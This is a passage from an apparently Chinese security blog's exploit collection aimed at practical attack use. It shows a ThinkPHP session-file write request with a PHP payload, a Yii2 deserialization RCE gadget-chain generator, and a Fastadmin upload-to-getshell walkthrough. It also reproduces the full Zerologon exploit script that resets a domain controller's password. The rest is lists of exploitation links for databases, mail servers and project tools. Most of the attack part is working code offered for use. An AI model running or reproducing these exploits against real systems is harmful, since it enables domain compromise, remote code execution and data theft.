class="attribute">Origin</span>: http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/tp6/public/index.php/index/test1</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=1234567890123456789012345678.php;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">key=&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148"><a href="#3、Yii-2框架反序列化远程命令执漏洞-CVE-2020-15148" class="headerlink" title="3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148"></a>3、Yii 2框架反序列化远程命令执漏洞 CVE-2020-15148</h4><figure class="highlight php"><figcaption><span>exp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span> <span class="title">extends</span> \<span class="title">yii</span>\<span class="title">base</span>\<span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span> <span class="keyword">extends</span> <span class="title">Action</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = $func;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = $param;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction($func, $param), <span class="string">"run"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">base</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">BaseObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        //</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span> <span class="keyword">extends</span> <span class="title">BaseObject</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession($func, $param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = <span class="keyword">new</span> \yii\db\BatchQueryResult($func, $param);</span><br><span class="line"><span class="keyword">print</span>(serialize($exp));</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://mp.weixin.qq.com/s/3a3whSUhxMZz2g3btxdytw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3a3whSUhxMZz2g3btxdytw</a> <a href="https://xz.aliyun.com/t/8307" target="_blank" rel="noopener">https://xz.aliyun.com/t/8307</a></p>
<h4 id="4、Fastadmin文件上传漏洞，危害级别：高危"><a href="#4、Fastadmin文件上传漏洞，危害级别：高危" class="headerlink" title="4、Fastadmin文件上传漏洞，危害级别：高危"></a>4、Fastadmin文件上传漏洞，危害级别：高危</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">通过前文可知，这个漏洞的利用点在_empty()函数，需要注意的是，在官方文档中通常_empty()方法是用来判断一个方法是否存在，如果不存在，则进入该函数。而这里是开发者自定义的方法，因此直接传入_empty方法，调用name参数即可。</span><br><span class="line"></span><br><span class="line">利用过程如下：</span><br><span class="line"></span><br><span class="line">在前台的会员中心，个人资料处，上传修改头像：</span><br><span class="line"></span><br><span class="line">5.png</span><br><span class="line"></span><br><span class="line">抓包后修改图片数据（满足图片头格式即可）：</span><br><span class="line"></span><br><span class="line">6.png</span><br><span class="line"></span><br><span class="line">记录下路径后，成功getshell</span><br><span class="line"></span><br><span class="line">7.png</span><br><span class="line"></span><br><span class="line">在Linux下，通过这种方法会失效，因为在&#x2F;public路径下不存在user目录，由前文中的知识点可以知道，当不存在这个目录的时候，无论怎么跳转目录，is_file()函数返回的结果始终未false，因此无法利用该漏洞，如下图所示：</span><br><span class="line"></span><br><span class="line">8.png</span><br><span class="line"></span><br><span class="line">当我们在&#x2F;public目录下创建文件夹&#x2F;user，在利用，即可成功：</span><br><span class="line"></span><br><span class="line">9.png</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnpanda.net/codeaudit/777.html" target="_blank" rel="noopener">https://www.cnpanda.net/codeaudit/777.html</a></p>
<h4 id="5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540"><a href="#5、thinkadmin-目录遍历-任意文件读取-CVE-2020-25540" class="headerlink" title="5、thinkadmin 目录遍历/任意文件读取 CVE-2020-25540"></a>5、thinkadmin 目录遍历/任意文件读取 CVE-2020-25540</h4><p>参考：<a href="https://github.com/zoujingli/ThinkAdmin/issues/244" target="_blank" rel="noopener">https://github.com/zoujingli/ThinkAdmin/issues/244</a></p>
<h2 id="五、操作系统"><a href="#五、操作系统" class="headerlink" title="五、操作系统"></a>五、操作系统</h2><h4 id="1、Windows-NetLogon特权提升漏洞-CVE-2020-1472"><a href="#1、Windows-NetLogon特权提升漏洞-CVE-2020-1472" class="headerlink" title="1、Windows NetLogon特权提升漏洞 CVE-2020-1472"></a>1、Windows NetLogon特权提升漏洞 CVE-2020-1472</h4><p><strong>利用条件：</strong></p>
<p>未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞。成功利用此漏洞的攻击者可获得域管理员访问权。</p>
<p>可以下载<a href="https://github.com/Kamimuka/CVE-2020-1472/blob/master/2.py" target="_blank" rel="noopener">利用脚本1-置空密码</a>和<a href="https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py" target="_blank" rel="noopener">利用脚本2-恢复密码</a>来Getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># CVE-2020-1472 - Zerologon</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Paper:    https://www.secura.com/pathtoimg.php?id=2055</span></span><br><span class="line"><span class="comment"># PoC by:   Pablo Martínez (@xassiz) &amp;&amp; Antón Ortigueira (@antuache) from BlackArrow</span></span><br><span class="line"><span class="comment"># Web:      [www.blackarrow.net] - [www.tarlogic.com]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.ndr <span class="keyword">import</span> NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray, \</span><br><span class="line">	NDRUniFixedArray, NDRUniConformantVaryingArray</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dtypes <span class="keyword">import</span> WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, NULL, LONG, UCHAR, PRPC_SID, \</span><br><span class="line">	GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.nrpc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> nrpc, epm</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5.dtypes <span class="keyword">import</span> NULL</span><br><span class="line"><span class="keyword">from</span> impacket.dcerpc.v5 <span class="keyword">import</span> transport</span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> crypto</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hmac, hashlib, struct, sys, socket, time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_call</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.</span></span><br><span class="line">MAX_ATTEMPTS = <span class="number">2000</span> <span class="comment"># False negative chance: 0.04%</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fail</span><span class="params">(msg)</span>:</span></span><br><span class="line">	print(msg, file=sys.stderr)</span><br><span class="line">	print(<span class="string">'This might have been caused by invalid arguments or network issues.'</span>, file=sys.stderr)</span><br><span class="line">	sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_zero_authenticate</span><span class="params">(dc_handle, dc_ip, target_computer)</span>:</span></span><br><span class="line">	<span class="comment"># Connect to the DC's Netlogon service.</span></span><br><span class="line">	binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=<span class="string">'ncacn_ip_tcp'</span>)</span><br><span class="line">	rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()</span><br><span class="line">	rpc_con.connect()</span><br><span class="line">	rpc_con.bind(nrpc.MSRPC_UUID_NRPC)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Use an all-zero challenge and credential.</span></span><br><span class="line">	plaintext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">	ciphertext = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.</span></span><br><span class="line">	flags = <span class="number">0x212fffff</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Send challenge and authentication request.</span></span><br><span class="line">	nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'\x00'</span>, plaintext)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + <span class="string">'\x00'</span>, target_computer + <span class="string">'$\x00'</span>, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + <span class="string">'\x00'</span>, ciphertext, flags)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># It worked!</span></span><br><span class="line">		<span class="keyword">assert</span> server_auth[<span class="string">'ErrorCode'</span>] == <span class="number">0</span></span><br><span class="line">		<span class="keyword">return</span> rpc_con</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> nrpc.DCERPCSessionError <span class="keyword">as</span> ex:</span><br><span class="line">	<span class="comment"># Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.</span></span><br><span class="line">		<span class="keyword">if</span> ex.get_error_code() == <span class="number">0xc0000022</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			fail(<span class="string">f'Unexpected error code from DC: <span class="subst">&#123;ex.get_error_code()&#125;</span>.'</span>)</span><br><span class="line">	<span class="keyword">except</span> BaseException <span class="keyword">as</span> ex:</span><br><span class="line">		fail(<span class="string">f'Unexpected error: <span class="subst">&#123;ex&#125;</span>.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_attack</span><span class="params">(dc_handle, dc_ip, target_computer)</span>:</span></span><br><span class="line">	<span class="comment"># Keep authenticating until succesfull. Expected average number of attempts needed: 256.</span></span><br><span class="line">	print(<span class="string">"[!] CVE-2020-1472 PoC by BlackArrow (Tarlogic)\n"</span>)</span><br><span class="line">	print(<span class="string">'Performing authentication attempts...'</span>)</span><br><span class="line">	rpc_con = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">for</span> attempt <span class="keyword">in</span> range(<span class="number">0</span>, MAX_ATTEMPTS):</span><br><span class="line">		rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rpc_con == <span class="literal">None</span>:</span><br><span class="line">			print(<span class="string">'='</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> rpc_con:</span><br><span class="line">		print(<span class="string">'\nSuccess! DC can be fully compromised by a Zerologon attack. (attempt=&#123;&#125;)'</span>.format(attempt))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(<span class="string">'\nAttack failed. Target is probably patched.'</span>)</span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> rpc_con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_authenticator</span><span class="params">(cred=<span class="string">b'\x00'</span> * <span class="number">8</span>)</span>:</span></span><br><span class="line">	authenticator = nrpc.NETLOGON_AUTHENTICATOR()</span><br><span class="line">	authenticator[<span class="string">'Credential'</span>] = cred</span><br><span class="line">	authenticator[<span class="string">'Timestamp'</span>] = <span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> authenticator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetrServerPasswordSet2</span><span class="params">(NDRCALL)</span>:</span></span><br><span class="line">	opnum = <span class="number">30</span></span><br><span class="line">	structure = (</span><br><span class="line">		(<span class="string">'PrimaryName'</span>, PLOGONSRV_HANDLE),</span><br><span class="line">		(<span class="string">'AccountName'</span>, WSTR),</span><br><span class="line">		(<span class="string">'SecureChannelType'</span>, NETLOGON_SECURE_CHANNEL_TYPE),</span><br><span class="line">		(<span class="string">'ComputerName'</span>, WSTR),</span><br><span class="line">		(<span class="string">'Authenticator'</span>, NETLOGON_AUTHENTICATOR),</span><br><span class="line">		(<span class="string">'ClearNewPassword'</span>, NL_TRUST_PASSWORD),</span><br><span class="line">	)</span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetrServerPasswordSet2Response</span><span class="params">(NDRCALL)</span>:</span></span><br><span class="line">	structure = (</span><br><span class="line">		(<span class="string">'ReturnAuthenticator'</span>, NETLOGON_AUTHENTICATOR),</span><br><span class="line">		(<span class="string">'ErrorCode'</span>, NTSTATUS),</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passwordSet2</span><span class="params">(rpc_con, dc_name, target_account)</span>:</span></span><br><span class="line">	dce = rpc_con</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> dce <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	request = NetrServerPasswordSet2()</span><br><span class="line">	request[<span class="string">'PrimaryName'</span>] = dc_name + <span class="string">'\x00'</span></span><br><span class="line">	request[<span class="string">'AccountName'</span>] = target_account + <span class="string">'\x00'</span></span><br><span class="line">	request[<span class="string">'SecureChannelType'</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel</span><br><span class="line">	request[<span class="string">'ComputerName'</span>] = dc_name + <span class="string">'\x00'</span></span><br><span class="line">	request[<span class="string">'Authenticator'</span>] = get_authenticator()</span><br><span class="line">	</span><br><span class="line">	clear = NL_TRUST_PASSWORD()</span><br><span class="line">	clear[<span class="string">'Buffer'</span>] = <span class="string">b'\x00'</span> * <span class="number">516</span></span><br><span class="line">	clear[<span class="string">'Length'</span>] = <span class="string">'\x00'</span> * <span class="number">4</span></span><br><span class="line">	request[<span class="string">'ClearNewPassword'</span>] = clear</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		print()</span><br><span class="line">		resp = dce.request(request)</span><br><span class="line">		resp.dump()</span><br><span class="line">		print(<span class="string">"[+] CVE-2020-1472 exploited\n"</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span></span><br><span class="line">	dce.disconnect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">3</span> &lt;= len(sys.argv) &lt;= <span class="number">4</span>):</span><br><span class="line">	print(<span class="string">'Usage: CVE-2020-1472.py &lt;nbios-name&gt; &lt;computer&gt; &lt;dc-ip&gt;\n'</span>)</span><br><span class="line">	print(<span class="string">'Performs the Zerologon attack and resets the computer password of the domain controller.'</span>)</span><br><span class="line">	print(<span class="string">'Note: nbios-name should be the (NetBIOS) computer name of the domain controller.'</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	[_, nbios_name, computer, dc_ip] = sys.argv</span><br><span class="line"></span><br><span class="line">	nbios_name = nbios_name.rstrip(<span class="string">'$'</span>)</span><br><span class="line">	rpc_con = perform_attack(<span class="string">'\\\\'</span> + nbios_name, dc_ip, nbios_name)</span><br><span class="line"></span><br><span class="line">	passwordSet2(rpc_con, nbios_name, computer)</span><br><span class="line"></span><br><span class="line">	rpc_con.disconnect()</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://mp.weixin.qq.com/s/MagXtN1hfNPTQdcIMDOZEA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MagXtN1hfNPTQdcIMDOZEA</a></p>
<p><a href="https://github.com/blackarrowsec/redteam-research" target="_blank" rel="noopener">https://github.com/blackarrowsec/redteam-research</a> </p>
<p><a href="https://www.cnblogs.com/forforever/p/13682344.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13682344.html</a> </p>
<p><a href="https://mp.weixin.qq.com/s/f1f1nGSMdEXJL3lY7FCMMw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/f1f1nGSMdEXJL3lY7FCMMw</a> </p>
<p><a href="https://www.cnblogs.com/forforever/p/13682344.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13682344.html</a></p>
<h4 id="2、永恒之蓝-MS17-17010"><a href="#2、永恒之蓝-MS17-17010" class="headerlink" title="2、永恒之蓝 MS17-17010"></a>2、永恒之蓝 MS17-17010</h4><p>内网刷分的利器</p>
<h2 id="六、数据库"><a href="#六、数据库" class="headerlink" title="六、数据库"></a>六、数据库</h2><h4 id="1、redis"><a href="#1、redis" class="headerlink" title="1、redis"></a>1、redis</h4><p><a href="https://xz.aliyun.com/t/256" target="_blank" rel="noopener">Redis未授权访问漏洞利用总结</a><br><a href="https://xz.aliyun.com/t/5616" target="_blank" rel="noopener">Redis 4.x RCE</a><br><a href="https://www.webshell.cc/5154.html" target="_blank" rel="noopener">redis利用姿势收集</a><br><a href="https://sploitus.com/?query=redis#exploits" target="_blank" rel="noopener">Redis历史漏洞合集</a></p>
<h4 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h4><p><a href="https://www.cnblogs.com/junsec/p/11390634.html" target="_blank" rel="noopener">Hadoop Yarn REST API未授权漏洞利用</a></p>
<h4 id="3、mysql"><a href="#3、mysql" class="headerlink" title="3、mysql"></a>3、mysql</h4><p><a href="https://xz.aliyun.com/t/1122" target="_blank" rel="noopener">Mysql提权(CVE-2016-6663、CVE-2016-6664组合实践)</a><br><a href="https://xz.aliyun.com/t/1" target="_blank" rel="noopener">Mysql数据库渗透及漏洞利用总结</a><br><a href="https://www.lshack.cn/596/" target="_blank" rel="noopener">Mysql 注入专辑</a><br><a href="https://www.cnblogs.com/muxueblog/p/13043768.html" target="_blank" rel="noopener">PhpMyadmin的几种getshell方法</a><br><a href="https://xz.aliyun.com/t/2199" target="_blank" rel="noopener">高版本MySQL之UDF提权</a><br><a href="https://sploitus.com/?query=mysql#exploits" target="_blank" rel="noopener">Mysql历史漏洞合集</a></p>
<h4 id="4、Mssql"><a href="#4、Mssql" class="headerlink" title="4、Mssql"></a>4、Mssql</h4><p><a href="https://forum.ywhack.com/thread-114737-1-1.html" target="_blank" rel="noopener">Mssql利用姿势整理(史上最全)</a><br><a href="https://xz.aliyun.com/t/7534" target="_blank" rel="noopener">Mssql数据库命令执行总</a><br><a href="https://xz.aliyun.com/t/8195" target="_blank" rel="noopener">利用mssql模拟登录提权</a><br><a href="https://xz.aliyun.com/t/8513" target="_blank" rel="noopener">高级的MSSQL注入技巧</a><br><a href="https://xz.aliyun.com/t/6682" target="_blank" rel="noopener">MSSQL使用CLR程序集来执行命令</a></p>
<h4 id="5、Nosql"><a href="#5、Nosql" class="headerlink" title="5、Nosql"></a>5、Nosql</h4><p><a href="https://www.chainnews.com/articles/094943717085.htm" target="_blank" rel="noopener">NoSql 数据库之漏洞利用方法总结</a></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="七、邮件"><a href="#七、邮件" class="headerlink" title="七、邮件"></a>七、邮件</h2><p>参考：<a href="https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wiZJUQ6Un9UuE98YFBYWig</a></p>
<h4 id="1、Exchange"><a href="#1、Exchange" class="headerlink" title="1、Exchange"></a>1、Exchange</h4><p><a href="https://srcincite.io/advisories/src-2020-0025/" target="_blank" rel="noopener">CVE-2020-17083 Microsoft Exchange Server 远程执行代码漏洞</a></p>
<p><a href="https://github.com/rapid7/metasploit-framework/pull/14126" target="_blank" rel="noopener">Microsoft Exchange远程代码执行漏洞（CVE-2020-16875）</a></p>
<p><a href="https://xz.aliyun.com/t/7321" target="_blank" rel="noopener">CVE-2020-0688_微软EXCHANGE服务的远程代码执行漏洞</a></p>
<p><a href="https://xz.aliyun.com/t/3670" target="_blank" rel="noopener">Microsoft Exchange任意用户伪造漏洞</a></p>
<p><a href="https://sploitus.com/?query=Exchange#exploits" target="_blank" rel="noopener">Exchange 历史漏洞合集</a></p>
<h4 id="2、coremail"><a href="#2、coremail" class="headerlink" title="2、coremail"></a>2、coremail</h4><p><a href="https://www.lsablog.com/networksec/penetration/coremail-info-leakage-and-webservice-unauthorization-reproduce/" target="_blank" rel="noopener">coremail 配置信息泄露及接口未授权漏洞</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-94754" target="_blank" rel="noopener">Coremail的存储型XSS漏洞</a></p>
<p><a href="https://sploitus.com/?query=Coremail#exploits" target="_blank" rel="noopener">Coremail 历史漏洞合集</a></p>
<h2 id="八、项目管理"><a href="#八、项目管理" class="headerlink" title="八、项目管理"></a>八、项目管理</h2><h4 id="1、禅道"><a href="#1、禅道" class="headerlink" title="1、禅道"></a>1、禅道</h4><p><a href="https://blog.csdn.net/qq_36197704/article/details/109385695" target="_blank" rel="noopener">CNVD-C-2020-121325 禅道开源版文件上传漏洞</a></p>
